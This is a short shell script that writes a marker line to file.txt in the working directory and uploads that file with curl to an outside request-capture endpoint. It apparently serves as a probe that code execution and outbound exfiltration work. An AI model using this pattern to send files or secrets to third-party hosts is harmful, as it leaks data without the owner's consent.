#!/bin/sh

echo "CREATING FILE IN PWD" > file.txt

curl --data-binary "@file.txt" https://enmwh7jh1sqb.x.pipedream.net
